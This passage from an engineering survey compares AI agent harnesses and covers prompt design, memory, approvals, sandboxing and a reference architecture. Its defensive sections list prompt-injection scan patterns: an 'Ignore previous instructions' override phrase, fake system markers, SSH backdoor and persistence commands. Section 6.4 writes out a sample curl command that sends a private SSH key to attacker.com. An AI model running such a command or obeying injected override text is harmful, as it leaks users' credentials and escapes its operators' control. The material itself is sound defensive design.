- **Hardcoded Python multi-line strings** — VVAH, DeepAgents. Fastest to iterate, hardest to override.
- **User overrides** at `~/.config/{tool}/prompts/{name}` — Goose is exemplary here. Highly recommended pattern.

**Reusable prompt blocks (VVAH's approach):**

```python
# vvaharness/util/prompts.py
EXCLUSION_RULES = """OUT OF SCOPE — do not report: ..."""
SELF_VERIFICATION = """GATE EVERY FINDING ON THESE FIVE CHECKS: ..."""
SEVERITY_GUIDANCE = """..."""
EXHAUSTIVENESS = """..."""
```

Injected into multiple stage prompts by concatenation. This is the *composable prompt* pattern; it's underused elsewhere and worth adopting.

**Repo-scoped instruction files — the AGENTS.md convention:**

Every mature harness for coding tasks reads a file at repo root:
- Codex: `AGENTS.md`
- Goose: `.goosehints`
- Hermes: `.hermes.md` / `HERMES.md` (falls back to `AGENTS.md`, `.cursorrules`)
- Open SWE: `AGENTS.md`
- DeepAgents: any path passed to `MemoryMiddleware`

**Write one for every repo you own.** These files:
- Set testing rules ("run `cargo test` after every change")
- Set naming/style conventions
- Enumerate build commands
- List do-not-touch areas
- Provide domain context

They compose into the Tier-2 layer of the prompt automatically.

**Cache-safety invariants (non-negotiable for prompt caching):**

1. Tier-1 must be byte-stable across turns.
2. No mid-conversation tool-list swap (invalidates cache).
3. No mid-conversation system-prompt rebuild (only on compaction).
4. No injecting synthetic user messages that break role alternation.

Hermes documents these explicitly. Codex enforces them in the Responses API path.

**Prompt-injection defense (Hermes' `tools/threat_patterns.py`):**

Context files (`AGENTS.md`, `SOUL.md`, `.cursorrules`) loaded from a repo are attacker-controlled if you didn't write the repo. Scan them for:
- `Ignore previous instructions...`
- Injection markers (`<|system|>`, `<system>`, `[[system]]`)
- SSH backdoor patterns (in `strict` scope)
- Persistence commands (crontab, systemd unit writes)

Replace hits with `[BLOCKED: reason]` placeholders and log the finding.

**Design cheat-sheet:**
- Three-tier prompt. Freeze tier 1.
- Support **user overrides at `~/.config/…/prompts/`**.
- Use **shared prompt blocks** (`SELF_VERIFICATION`, `EXCLUSION_RULES`) that compose into multiple stage prompts.
- **Scan context files at ingest** for prompt injection.
- Load `AGENTS.md` from the repo root and every ancestor up to git root (Open SWE's `SubdirAgentsReadMiddleware`).

---

### 5.8 Memory & context management

**Short-term (working memory):**

Universal: the message list is the working memory. It's checkpointed after every turn, resumed on new invocations.

**Long-term (persistent memory):**

| Repo | Long-term mechanism |
|---|---|
| VVAH | Threat model, findings, ContextPackage, remediation DTOs — all pydantic + SQLite. No LLM-facing long-term memory. |
| Open SWE | LangGraph store; per-thread `ThreadSettings`; review findings under `["review_findings", pr_key]` namespace |
| DeepAgents | `MemoryMiddleware` loads AGENTS.md-style markdown files at session start; `FilesystemMiddleware` provides virtual FS backends (`StateBackend`, `FilesystemBackend`, `StoreBackend`, `CompositeBackend`) |
| Autoresearch | `results.tsv` (human-tracked); git branch = experiment history |
| Hermes | Pluggable `MemoryProvider` interface — built-in local `MEMORY.md`; optional Honcho (dialectic reasoning), Hindsight (vector), Mem0, Supermemory |
| Bedrock Engineer | Chat history JSON files; Bedrock Knowledge Base via `retrieve` tool |
| Codex | Extracted memories in `~/.codex/memories/`; `memories/read` + `memories/write` crates; injected into next-session prompt |
| Goose | Memory MCP server (`memory__create/read/update/delete`) + summarization compaction |

**Context compaction — the two mature designs:**

1. **DeepAgents' `SummarizationMiddleware`:** monitor token count; when > threshold, LLM-summarize older messages, offload to `/conversation_history/{session_id}.md` (with media in `media/` subdirectory), keep recent N in-window.
2. **Codex's inline + remote compact:** three flavors — synchronous inline (`compact.rs`, same model), background remote (`compact_remote.rs`, via Responses API), and v2 with explicit `compaction_trigger` items (`compact_remote_v2.rs`).

Both use a smaller/cheaper model for summarization (`gpt-5.6-luna`, `claude-haiku-4-5`).

**Anti-thrash protection** (Hermes' `compression.anti_thrash_cooldown_s = 600`): once you compact, wait 10 minutes before compacting again, or you'll re-summarize summaries.

**Trivial-prompt gate** (Hermes' `is_trivial_prompt`): skip memory-provider prefetch for one-word replies (`yes`, `ok`, `thanks`), greetings, and slash commands. Otherwise every reply pays for a vector search.

**Design cheat-sheet:**
- **Two-tier memory**: in-session messages + long-term markdown/YAML files loaded into system prompt.
- **Pluggable long-term provider interface**: `is_available()`, `prefetch(query)`, `sync_turn(msg, reply)`, `get_tool_schemas()`, `handle_tool_call()`.  (Hermes' `MemoryProvider` is the reference.)
- **Compaction cooldown** to prevent thrashing.
- **Offload large tool results to disk** with markdown pointer (`<persisted-output>path</persisted-output>`), not to context.
- **Trivial-prompt gate** to skip expensive lookups on greetings.

---

### 5.9 Planning

The eight repos split cleanly on planning philosophy:

**Camp A — implicit planning (5/8):** DeepAgents, Hermes, Bedrock Engineer, Goose, Autoresearch. The LLM plans in its head; the harness provides a `todo` tool or lets the model output a `## Plan` heading. No dedicated planner stage.

**Camp B — explicit planner stage (3/8):** VVAH (S3 Decompose stage produces `TaskManifest`), Open SWE (`enter_plan_mode` / `save_plan` / `approve_plan` workflow with HTML plan artifact), Codex (`plan` tool + streaming `## Plan` extractor).

**Camp C — declarative recipes (Goose):** Goose adds a *third* layer — YAML recipes that define multi-step workflows independently of any single LLM call:

```yaml
version: "1.0.0"
title: "Code Review"
instructions: |
  You are a code reviewer...
extensions:
  - name: developer
    required: true
settings:
  goose_provider: anthropic
  goose_model: claude-sonnet-4-5
  temperature: 0.7
  max_turns: 20
parameters:
  - name: pr_url
    type: string
response:
  json_schema: { type: object, properties: {...} }
sub_recipes:
  - name: lint_check
    path: recipes/lint.yaml
    sequential_when_repeated: true
```

Recipes are the closest thing to a "workflow" in these harnesses. Sub-recipes can be sequential or parallel; each sub-recipe is a fresh sub-session.

**When to use each:**

- **Implicit planning** — general-purpose agent, unknown task shape.
- **Explicit planner stage** — safety-critical tasks (VVAH's vulnerability analysis, Open SWE's before-code-changes), or tasks with high fan-out (VVAH's per-chunk deep dive).
- **Recipes** — repeatable workflows with parameterized inputs, or when the user is expected to author + share workflows.

**Design cheat-sheet:**
- Ship a `todo` / `plan` tool even in the implicit-planning camp. Users want it visible.
- If planning is safety-critical, **make the plan an artifact** users can review (Open SWE's HTML plan link, VVAH's `TaskManifest`).
- **Recipes are worth adding once the same workflow gets run twice.** They compose beautifully with subagents.

---

### 5.10 Human-in-the-loop & approvals

**Three approval modes (Codex-standard, adopted broadly):**

| Mode | Behavior | Best for |
|---|---|---|
| `suggest` | Always ask before any tool use | Untrusted repo, high-stakes op |
| `auto_edit` | Auto-apply non-shell edits; ask before shell | Interactive dev with trusted repo |
| `auto` / `full-auto` | Execute everything without asking | Automation, CI |
| `manual` (Codex-only) | Always ask, even for read-only tools | Learning mode |

**Approval mechanisms:**

- **Approval caching** (Codex `with_cached_approval`): first approval for `(tool_name, args_hash)` caches session-wide. Same-args re-invocation skips the prompt.
- **Interrupt-before-tool** (DeepAgents `interrupt_on={"edit_file": True}`): declarative per-tool interrupt policy compiled into LangGraph's `interrupt_before`.
- **Guardian framework** (Codex `codex-rs/core/src/guardian/`): centralized approval system with multiple reviewers — user (TUI), hook system (custom scripts), or model (`gpt-5.6-luna` auto-reviewer).
- **Permission judge** (Goose `permission_judge.md`): LLM analyzes tool call intent, decides `Approved` / `Needs Confirmation` / `Denied` before showing to user.
- **Elicitation** (Goose): agent pauses, UI shows modal, user's response streams back as ACP elicitation event.
- **Draft PR + review link** (Open SWE): tool doesn't block the loop — it produces an artifact the user reviews asynchronously.
- **Message queue injection** (Open SWE `check_message_queue_before_model` middleware): user follow-ups posted while the agent runs get injected before the next model call, so the agent picks them up mid-turn.

**Interrupt handling:**

- **Cooperative cancellation** (VVAH `abort()`): sets a threading `Event`, kills every in-flight subprocess, worker threads check `aborted()` and exit cleanly.
- **Ctrl-C → resume** (Codex, Goose): current turn interrupted; state checkpointed; next invocation resumes.
- **Async multitask strategy** (Open SWE `"interrupt"`): new message halts active run and resumes with full history.

**Design cheat-sheet:**
- Ship all three (`suggest`, `auto-edit`, `auto`) modes. Default to `suggest`.
- **Cache approval decisions by `(tool_name, canonical_args_hash)`**. Not by call ID.
- **Cooperative cancellation via a shared flag + subprocess kill**. Never leave orphan processes.
- **Async approval flows** (draft PR, review link) unblock the loop and are highly-usable for teams.

---

### 5.11 Sandboxing & safety

This is the largest source of variation and the highest source of production risk.

**Filesystem safety layers (universal):**

1. **Path jail:** canonicalize path, reject `..`, reject if not `relative_to(root)`. VVAH's `_jail()` is the reference; DeepAgents' `FilesystemPermission` is the declarative version.
2. **Symlink rejection** (VVAH, DeepAgents, Codex): the final component of a resolved path must not be a symlink pointing outside root.
3. **Size caps:** `_MAX_BYTES = 200_000` (VVAH); Hermes spills > 100 KB to disk.
4. **Redaction on ingest:** every tool result that flows back to the model has secrets/PII masked (VVAH's `redact_counts()`).

**Shell execution — the sandbox hierarchy:**

| Level | Tech | Repos |
|---|---|---|
| **No sandbox** (host shell) | fork/exec inherits env | Bedrock Engineer, Hermes local mode, Open SWE local dev |
| **Container** | Docker per-task | Hermes Docker backend, DeepAgents partner-modal |
| **OS-level sandbox** | Seatbelt (macOS), Landlock+bwrap (Linux), RestrictedToken/Elevated (Windows) | Codex (only repo in the set that does all three) |
| **Cloud sandbox** | Managed serverless VMs | Open SWE (LangSmith, Modal, Daytona, Runloop, E2B); DeepAgents partners; Hermes (Modal, Daytona, Vercel) |

**Codex's Linux sandbox is the reference implementation** and worth studying:

- **Landlock** (kernel ≥ 6.2): filesystem ACLs applied in-process, no daemon needed.
- **Bubblewrap (bwrap)** fallback: container-like FS isolation via user namespaces.
- **seccomp:** syscall filter (reject `ptrace`, `mount`, most privileged calls).
- **`no_new_privs`:** prevent setuid escalation.
- **Managed network proxy:** default-block egress; `DeferredNetworkApproval` pauses tool, asks user, then enables proxy.

**Cloud sandbox providers as a swappable interface** is Open SWE's biggest architectural insight and the answer to "how do we run agents at scale without giving them our laptop":

```python
SANDBOX_TYPE = "langsmith" | "modal" | "daytona" | "runloop" | "e2b" | "local"
```

Each provider implements the same `SandboxBackendProtocol` (`read_file`, `write_file`, `execute`, `ls`, ...). Providers differ by cold-start (Modal ~10s, Daytona ~30s, LangSmith ~30s–1m), persistence (Modal is stateless per task; LangSmith persists across turns), and pricing.

**GitHub proxy** (Open SWE's LangSmith integration): sandbox has no credentials; the LangSmith proxy intercepts git/API traffic to `github.com` and `api.github.com` and injects auth (Basic for git, Bearer for API/`gh`). Agent runs plain `gh pr create` without credentials.

**Prompt-injection defense:**
- **Adversary inspector** (Goose): heuristic analysis of tool calls for exfil URLs, SSH backdoor patterns, persistence commands.
- **Threat pattern scanner** (Hermes): scans context files at ingest; replaces detected injections with `[BLOCKED: ...]`.
- **Egress inspector** (Goose): blocks blacklisted outbound domains.

**Secret handling:**
- **OS keyring** for credentials (Goose `keyring` crate; Bedrock Engineer Electron Store with OS keychain backing).
- **Env-var loaders** (`python-dotenv`, `.env` files) for dev.
- **Redaction in logs** (all repos claim it; VVAH implements it most thoroughly).

**Design cheat-sheet:**
- **Never trust the model with a raw shell on the host.** At minimum: container. Ideal: Landlock+bwrap (Linux) / Seatbelt (macOS) / RestrictedToken (Windows). Best: pluggable cloud sandbox.
- **Path jail every filesystem tool** (canonicalize, reject symlink escapes).
- **Default-block network egress.** Deferred network approval > blanket allow-all.
- **Store credentials in OS keyring**; never in JSON in the config directory.
- **Scan context files for prompt injection** on ingest.

---

### 5.12 Observability, tracing & cost

**Three tracing backends dominate:**

- **LangSmith** — DeepAgents, Open SWE (native).
- **LangFuse** — Goose (via `tracing/langfuse_layer.rs`); optional in Hermes.
- **OpenTelemetry (OTLP)** — Goose, Codex (`opentelemetry`, `opentelemetry-otlp`).

**Universal metrics:**

- `gen_ai.provider.name`, `gen_ai.request.model`, `gen_ai.response.finish_reasons`
- `gen_ai.usage.input_tokens`, `gen_ai.usage.output_tokens`, `gen_ai.usage.cache_read_tokens`, `gen_ai.usage.cache_creation_tokens`
- `session.id`, `turn.id`
- `tool.{name}.duration`, `tool.{name}.status`
- `approval.decision`, `approval.duration`

**Codex's metric taxonomy** (representative):
```text
codex.turn.ttft                 # time-to-first-token
codex.tool.*.duration           # per-tool
codex.approval.requested
codex.sandbox.type              # distribution
codex.token.usage               # I/O
codex.compaction.reason         # trigger type
```

**Token counting:**

- **Precise:** `tiktoken` for OpenAI models; `tiktoken-rs` in Goose.
- **Estimated:** char/word heuristic for Anthropic (Anthropic's tokenizer is not public; heuristics are 5–15% off).
- **Provider-returned:** every response includes `usage` — this is the source of truth.

**Cost tracking is a harness concern, not a provider concern:**

- Every provider returns tokens; the harness maintains a per-token price table (Bedrock Engineer's `PricingCalculator`, Hermes' `usage_pricing.py`) and computes cost per session.
- Cumulative session cost is displayed in the UI (Bedrock Engineer's `useTokenAnalyticsModal`).

**Rate-limiting the telemetry itself** (Goose `tracing/rate_limiter.rs`): batched export prevents overwhelming Langfuse/OTLP endpoints.

**Design cheat-sheet:**
- **Emit OTel-standard `gen_ai.*` fields** so any observability backend (LangSmith, Langfuse, Datadog, Grafana) can ingest.
- **Ship cost tracking** with a pricing table. This is the first thing your CFO will ask for.
- **Log per-tool duration** so you can find slow MCP servers.
- **Rate-limit trace exports** for high-QPS deployments.
- **Log approval outcomes** for audit and process-improvement.

---

### 5.13 Configuration

**Universal patterns:**

1. **Config file at `~/.{app}/config.{toml,yaml,json}`** (Codex: `config.toml`, Goose: `config.yaml`, Hermes: `config.yaml`, VVAH: profile YAML).
2. **`.env` for secrets**, loaded via `python-dotenv` / `dotenv`.
3. **CLI flags override everything**.
4. **Provider registration via env vars** (all repos: `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `GOOGLE_API_KEY`, ...).
5. **OS keyring** for stored credentials post-first-run.

**Load order (Hermes, representative):**
```text
1. Hardcoded defaults
2. ~/.hermes/config.yaml
3. ~/.hermes/.env
4. CLI args
5. Profile-specific overrides (~/.hermes/profiles/{name}/config.yaml)
```

**Variable expansion** (VVAH): `${VAR}` and `${VAR:-default}` in YAML values, resolved against env.

**Configuration profiles** (VVAH: `config/profiles/{default,sdk,full,taint}.yaml`) let a single install serve multiple deployment styles. Codex has `profiles` too.

**Schema validation** — Codex publishes `config.schema.json` auto-generated from Rust types. This is the right pattern: types define config, docs and validation follow.

**Design cheat-sheet:**
- **TOML for user-facing config** (Codex, cargo-standard). YAML if you need lists-of-tools with complex nesting.
- **Profiles**, not one-config-fits-all. Ship at least `default`, `dev`, `ci`.
- **Auto-generate JSON schema** from your config types. Bind editor autocomplete.
- **Never commit secrets to config files.** Env vars or keyring.

---

### 5.14 Entry points & surfaces

**The standard trio:**

1. **CLI (interactive TUI)** — `codex`, `goose`, `hermes`, `dcode` (DeepAgents), `vvaharness`. Universal.
2. **CLI (one-shot / headless)** — `codex -x "prompt"`, `hermes chat -q "..."`, `goose run --recipe ...`, `dcode -x "prompt"`. Also universal.
3. **Programmatic SDK** — `create_deep_agent(...)`, `AIAgent(...)` (Hermes), `from vvaharness ...` (nascent).

**Additional surfaces:**

- **HTTP API / gateway** — Open SWE's FastAPI, Goose's embedded HTTP server, Hermes' `hermes gateway`, Bedrock Engineer's Express+socket.io IPC bridge.
- **Webhooks** — Open SWE's `/webhooks/{slack,linear,github}`; Hermes gateways (Telegram, Discord, Slack, Matrix, WhatsApp, Signal).
- **MCP server mode** — `codex mcp`, `goose mcp`, `hermes acp`. Expose the harness *as* a tool to other harnesses.
- **IDE integration** — Codex has VS Code / Cursor / Windsurf extensions; Hermes has ACP adapter for Copilot Chat; DeepAgents has ACP support.
- **Desktop app** — Bedrock Engineer (Electron), Goose (Electron), Codex (`codex app`), Hermes (`ui-tui/`).
- **Scheduled/cron** — Hermes `cron/`, Open SWE `scheduler` graph, Goose `goose schedule`.

**Deterministic thread IDs from surface** (Open SWE):
- Slack: `hash(channel_id, thread_ts)`
- Linear: `hash(issue_id)`
- GitHub PR: `hash(owner, repo, pr_number)`

Same thread ID → same LangGraph thread → follow-ups land on the same agent. This is the trick that makes multi-surface deployments feel coherent.

**Design cheat-sheet:**
- **CLI first**, but design the loop so the CLI is just one caller. This keeps the loop reusable for HTTP, webhooks, and MCP-server modes.
- **Deterministic thread IDs** for every invocation surface.
- **MCP server mode** for interop with other harnesses is a 100-line addition once the tool registry is solid.

---

### 5.15 Evaluation & testing

**The four levels of testing observed:**

1. **Unit tests** — every repo. Mock provider (`GenericFakeChatModel` in DeepAgents; SSE mocking in Codex's `TestCodexBuilder`), test middleware/state/tool logic in isolation.
2. **Integration tests** — VVAH smoke tests; Goose `crates/goose/tests/`; Codex `core/suite/`. Real LLM calls; end-to-end agent runs on tiny inputs.
3. **Snapshot / regression tests** — Codex TUI snapshots via `insta` (`just test -p codex-tui` → `.snap.new` → `cargo insta accept`). Prevents UI drift.
4. **Evaluation suites** — DeepAgents has `libs/evals/` with Harbor integration; Goose has `goose-self-test.yaml` (a recipe that exercises core capabilities); Open SWE has `evals/reviewer/`; VVAH has `estimate` command as a poor-man's benchmark.

**Behavior-contract testing** (Hermes' AGENTS.md philosophy): assert invariants (`role alternation never breaks`, `cache prefix stable`, `all tools have schemas`) rather than value snapshots (`list has 42 items`). Change-detector tests are discouraged.

**Trajectory collection for training** (Hermes' `batch_runner.py`, `trajectory_compressor.py`): spawn N parallel agents, capture full histories as JSONL, use for supervised fine-tuning of open-weight models. Only Hermes does this at scale.

**Design cheat-sheet:**
- **Mock provider for unit tests.** `GenericFakeChatModel` (LangChain) or SSE mocks (Codex) work fine.
- **Snapshot the TUI** if you have one.
- **Ship one integration recipe** ("hello world" for your harness) as a health check.
- **Invariant tests** > value snapshots.

---

## 6. Anti-patterns & recurring weaknesses

Across the eight repos, the same weaknesses appear again and again. Building a new harness is largely about avoiding these.

### 6.1 State corruption
- **Full-history rewrites** on every turn (Bedrock Engineer) instead of append-only. Slow, corruption-prone, no audit trail.
- **Pickle-based persistence.** VVAH bans it explicitly. Any object schema change breaks resume; unsafe deserialization risk.
- **No delta reducers.** Naive LangGraph checkpointing is O(N²) in message count. DeepAgents' `DeltaChannel` fixes it.

### 6.2 Loop hazards
- **Infinite tool-call loops** on models that request tools but emit no arguments. Fix: inject ephemeral `(empty)` assistant + nudge user message (Hermes), or increment a "dropped tool call" counter with escape (Open SWE).
- **Missing recursion caps.** Two of the eight had bills-blowup war stories in issues (Open SWE's `MODEL_CALL_RECURSION_LIMIT=5000` exists for a reason).
- **Prompt-cache invalidation** from mid-conversation prompt rebuild. Rare bug, easy to miss, breaks 90% cache hit → 0%.

### 6.3 Tool hazards
- **`write_file` on unbounded content** without patch format. Model regenerates 500-line files, sometimes drops sections silently. `apply_patch` avoids this.
- **Parallel tool calls without path-overlap check.** Two `write_file` to same path → last-writer-wins race. Every mature harness serializes them.
- **Unbounded tool result size.** Blows context, causes silent truncation. Spillover-to-disk with pointer marker is the fix.

### 6.4 Sandboxing gaps
- **Host shell = full trust.** Bedrock Engineer, Hermes local mode, Open SWE local dev all do this. Fine for dev, fatal for production.
- **Symlink escape via TOCTOU.** Even path canonicalization can be raced if you check-then-open. Use `openat` with `O_NOFOLLOW` where possible.
- **Blanket network egress.** Model can `curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)`. Default-deny + deferred approval (Codex) is the fix.

### 6.5 Memory gaps
- **No compaction cooldown → thrashing.** First compaction reduces context by 50%; if the threshold is close to the new size, next turn triggers again on the summary. Anti-thrash timer (Hermes' 600s default) fixes it.
- **Lossy summarization loses critical detail.** Every LLM-summarized compaction has this risk. Keep a raw log on disk you can grep. Never delete originals.

### 6.6 Provider gaps
- **Single-provider lock-in.** Bedrock Engineer only supports Bedrock. Adding a second provider now requires a large refactor.
- **No fallback chain.** 429 from Anthropic → dead session unless you rotate. Cross-provider fallback (Open SWE) + credential pooling (Hermes) both help.
- **Not exploiting prompt caching.** Free 10–90% cost reduction left on the table.

### 6.7 Observability gaps
- **Console logging only.** No structured logs → no aggregation → no debugging in prod. All eight ship some level of structured logging; only Codex/Goose emit OTLP by default.
- **Token counts not tracked per stage.** You can't tell why a session cost $47.
- **No cost dashboard.** Users don't discover the cost until the invoice.

### 6.8 UX gaps
- **Skills/tools discovery passive** (Hermes-called-out): agent has a great tool the user doesn't know about. Show a "you could use X" nudge when heuristics match.
- **No plan review UI.** Explicit planners (Open SWE, VVAH) that surface the plan let users course-correct before commit.
- **No rollback mechanism.** If an agent edits 20 files and the result is bad, you're in `git reflog` territory. Turn-scoped git refs (Open SWE) partially fix this.

### 6.9 Documented shortcomings, in summary
The following gaps appeared in ≥ 3 repos each:
- No distributed execution (single-machine scaling only). *Everyone.*
- No vector-DB / RAG built in (pluggable at best). *DeepAgents, Codex, Goose, VVAH.*
- Recipes/plans are linear, not adaptive. *Goose, VVAH, autoresearch.*
- No cross-thread learning. *Open SWE, DeepAgents, most.*
- Tight middleware coupling; refactoring risky. *Open SWE, DeepAgents, Hermes.*

---

## 7. Reference architecture blueprint

Below is a synthesized reference architecture for a new general-purpose agentic harness, distilling the strongest patterns from the eight references. Ignore or replace pieces as your domain demands; this is a starting point, not a straitjacket.

```text
┌────────────────────────────────────────────────────────────────────────────┐
│                                SURFACES                                    │
│  CLI (TUI + headless)   HTTP API   Webhooks (Slack/Linear/GH)   IDE ext   │
│  Desktop (Electron)     MCP server mode          Cron / scheduler         │
└───────────────────────────────────┬────────────────────────────────────────┘
                                    │  Deterministic thread_id from surface
                                    ▼
┌────────────────────────────────────────────────────────────────────────────┐
│                              CONTROL PLANE                                 │
│  ┌──────────────────────────────────────────────────────────────────────┐ │
│  │   Session store  (SQLite, append-only rollout log)                   │ │
│  │   ThreadSettings (model, effort, provider, sandbox, repo_hints)      │ │
│  └──────────────────────────────────────────────────────────────────────┘ │
│                                    │                                       │
│                                    ▼                                       │
│  ┌──────────────────────────────────────────────────────────────────────┐ │
│  │   Explicit Step[] engine  (Goose-style)                              │ │
│  │     EntryHooks → Recipe → Skill → SlashCmd → Steer →                 │ │
│  │     ContextInject → InferenceRunner → ToolExec →                     │ │
│  │     ToolApproval → Compaction → MaxTurns → StopHooks                 │ │
│  │                                                                      │ │
│  │   Each Step returns NotApplicable | Applied(Effects)                 │ │
│  │   yield_to_client => return to surface                               │ │
│  └──────────────────────────────────────────────────────────────────────┘ │
└─────┬─────────────────────┬─────────────────┬────────────────────┬────────┘
      │                     │                 │                    │
      ▼                     ▼                 ▼                    ▼
┌─────────────┐    ┌──────────────┐    ┌──────────────┐    ┌───────────────┐
│  Provider   │    │  Tool        │    │  Memory      │    │  Sandbox      │
│  Layer      │    │  Registry    │    │  Providers   │    │  Providers    │
│             │    │              │    │              │    │               │
│  Multi-     │    │  MCP         │    │  Local MD    │    │  Landlock+    │
│  provider   │    │  Builtin     │    │  Vector DB   │    │  bwrap        │
│  Fallback   │    │  Dynamic     │    │  Honcho      │    │  Seatbelt     │
│  Cache      │    │              │    │  KV/S3       │    │  Modal        │
│  Streaming  │    │  Registry    │    │              │    │  Daytona      │
│             │    │  + AST scan  │    │  MemoryProv  │    │  E2B          │
│  Per-role   │    │  cache       │    │  interface   │    │  Local        │
└─────────────┘    └──────────────┘    └──────────────┘    └───────────────┘
      │                     │                 │                    │
      └─────────────────────┴─────────────────┴────────────────────┘
                                    │
                                    ▼
┌────────────────────────────────────────────────────────────────────────────┐
│                        CROSS-CUTTING LAYERS                                │
│  Prompt Builder (3-tier: stable / context / volatile; user overrides)      │
│  Approval Cache (session-scoped by hash(tool_name, canonical_args))        │
│  Observability (OTel gen_ai.* + Langfuse/LangSmith + cost calculator)      │
│  Config (TOML w/ schema; profiles: default/dev/ci; env-var expansion)      │
│  Redaction + Prompt-Injection Scanner                                      │
│  DeltaChannel checkpoint reducer (O(N) growth)                             │
└────────────────────────────────────────────────────────────────────────────┘
```

### 7.1 Suggested crate/package layout (Rust variant)

```text
your-harness/
├── Cargo.toml                  # workspace root
├── crates/
│   ├── core/                   # session, turn loop, Step[] engine
│   │   └── src/
│   │       ├── session.rs
│   │       ├── turn.rs
│   │       ├── state_machine/  # ops_*.rs per step
│   │       ├── context/        # prompt tiers
│   │       └── rollout.rs
│   ├── agent-graph-store/      # DAG of parent→child
│   ├── providers/              # trait + built-ins
│   ├── provider-types/         # shared types
│   ├── tools/                  # registry + built-in tool impls
│   ├── mcp/                    # MCP client
│   ├── mcp-server/             # expose harness as MCP
│   ├── sandboxing/             # abstraction
│   ├── linux-sandbox/          # Landlock+bwrap
│   ├── windows-sandbox/        # RestrictedToken
│   ├── apply-patch/            # patch parser (steal Codex's format)
│   ├── skills/                 # SKILL.md discovery
│   ├── memories/               # long-term memory
│   ├── prompts/                # templates + minijinja
│   ├── observability/          # OTel + Langfuse + cost
│   ├── state/                  # SQLite wrapper
│   ├── cli/                    # entry: TUI + headless
│   ├── tui/                    # ratatui frontend
│   ├── app-server/             # HTTP + WS + JSON-RPC
│   └── evals/                  # eval suite
└── docs/
```

### 7.2 Suggested package layout (Python variant)

```text
your_harness/
├── pyproject.toml
├── your_harness/
│   ├── __init__.py            # public API: create_agent(), Session, etc.
│   ├── graph.py               # loop factory (like create_deep_agent)
│   ├── state.py               # AgentState + DeltaChannel reducer
│   ├── middleware/
│   │   ├── filesystem.py
│   │   ├── subagents.py
│   │   ├── summarization.py
│   │   ├── patch_tool_calls.py
│   │   ├── memory.py
│   │   ├── prompt_caching_anthropic.py
│   │   ├── prompt_caching_bedrock.py
│   │   └── human_in_the_loop.py
│   ├── backends/               # sandbox backends
│   │   ├── state.py            # ephemeral in-memory
│   │   ├── filesystem.py       # local FS
│   │   ├── store.py            # LangGraph store
│   │   ├── composite.py
│   │   └── protocol.py
│   ├── providers/
│   │   ├── base.py             # Provider trait/abc
│   │   ├── openai.py
│   │   ├── anthropic.py
│   │   ├── bedrock.py
│   │   ├── google.py
│   │   ├── ollama.py
│   │   └── declarative.py      # YAML-driven providers
│   ├── tools/                  # built-ins
│   ├── prompts/
│   │   ├── system.md
│   │   ├── compaction.md
│   │   ├── subagent_system.md
│   │   ├── plan.md
│   │   └── permission_judge.md
│   ├── profiles/
│   │   ├── harness/            # per-model tuning
│   │   └── provider/           # per-provider tuning
│   ├── config/
│   ├── observability/
│   └── cli/
├── tests/
├── evals/
└── docs/
```

### 7.3 The 10-week build sequence

If you had to build a general-purpose harness from scratch, this is the order that will minimize backtracking, distilled from patterns observed in the codebases above.

1. **Week 1** — Message model, provider trait, single provider (Anthropic or OpenAI), single-turn loop with hardcoded tools. Console I/O.
2. **Week 2** — SQLite session store, append-only rollout, session resume. Multi-turn loop.
3. **Week 3** — Tool registry (registration + JSON-schema derivation), MCP client, three built-in tools (shell, read_file, apply_patch).
4. **Week 4** — Path jail, approval prompts, `suggest`/`auto-edit`/`auto` modes, approval cache.
5. **Week 5** — Three-tier prompt (stable/context/volatile), AGENTS.md loader, prompt caching for Anthropic.
6. **Week 6** — DeltaChannel-style reducer, summarization compaction with anti-thrash cooldown, cost tracker.
7. **Week 7** — Second provider (fallback chain), OTel emitter with `gen_ai.*` fields, per-tool duration metrics.
8. **Week 8** — Subagent `task` tool, isolated child sessions, DAG tracking.
9. **Week 9** — Linux sandbox (Landlock+bwrap) or pluggable cloud sandbox (Modal or Daytona) — pick one; add the other in the follow-up.
10. **Week 10** — Second surface (HTTP + webhook), deterministic thread IDs from surface, MCP-server mode.

Skills/recipes/planning come after week 10. Every repo above bolted them on later.

---

## 8. Decision matrix

For each design decision, the trade-offs boil down to a small number of axes. This matrix summarizes what to pick and when.

| Decision | Options | Pick if… | Reference |
|---|---|---|---|
| **Language** | Rust / Python / TS | Rust for single-binary CLIs + OS sandboxes; Python for LangChain ecosystem + rapid iteration; TS for desktop | Codex/Goose (Rust); DeepAgents/Hermes (Python); Bedrock Engineer (TS) |
| **Loop shape** | Middleware stack / State machine / Monolithic | Middleware for pluggability; State machine for explicitness; Monolithic never (unmaintainable at scale) | DeepAgents (middleware); Goose (state machine) |
| **Wire format** | Chat Completions / Responses API / Custom | Chat Completions for cross-provider portability; Responses API if OpenAI-first | Everyone except Codex (Chat); Codex (Responses) |
| **Persistence** | Append-only rollout / Full-history rewrite / LangGraph store | Rollout by default; LangGraph if committing to that stack | Codex/Goose (rollout); Open SWE (LangGraph); Bedrock Engineer (rewrite — don't) |
| **Provider count** | 1 / 3+ / 15+ | 3+ minimum; 15+ if you're a platform play | Bedrock Engineer (1 — regret); Hermes/Goose (15+) |
| **Tool protocol** | Built-in Python/Rust functions / MCP / Both | MCP-first if third-party ecosystem matters; built-in if you own all tools; both once mature | Goose (MCP-first); DeepAgents (both) |
| **File edits** | apply_patch / edit_file (str replace) / write_file | Ship apply_patch; keep edit_file for simple cases; avoid raw write_file for coding agents | Codex (apply_patch is canonical) |
| **Prompt storage** | Hardcoded strings / Embedded MD templates / User-overridable MD | User-overridable at `~/.config/…/prompts/{name}` — Goose's pattern | Goose |
| **Long-term memory** | Built-in / Pluggable provider interface / None | Pluggable interface — don't marry one vendor | Hermes' `MemoryProvider` |
| **Compaction** | LLM summarize / Sliding window / Both | LLM summarize with anti-thrash cooldown; keep raw log on disk | DeepAgents (SummarizationMiddleware); Codex (compact/compact_remote); Hermes (context compressor) |
| **Sub-agent** | task tool / Multi-graph / None | task tool with depth cap 2 by default | DeepAgents / Hermes / Codex |
| **Approval modes** | 1 (always ask) / 3 (suggest/auto-edit/auto) / N (per-tool matrix) | 3 modes; approval cache by (tool, args_hash) | Codex |
| **Sandbox** | None / Container / OS-level / Cloud pluggable | OS-level for laptops; Cloud pluggable for teams | Codex (OS-level); Open SWE (cloud pluggable) |
| **Tracing** | Console / Structured logs / OTLP + Langfuse | OTLP with `gen_ai.*` for portability | Goose |
| **Config format** | TOML / YAML / JSON / Env only | TOML for user config; YAML for recipes/profiles; env for secrets | Codex (TOML); Goose (YAML) |
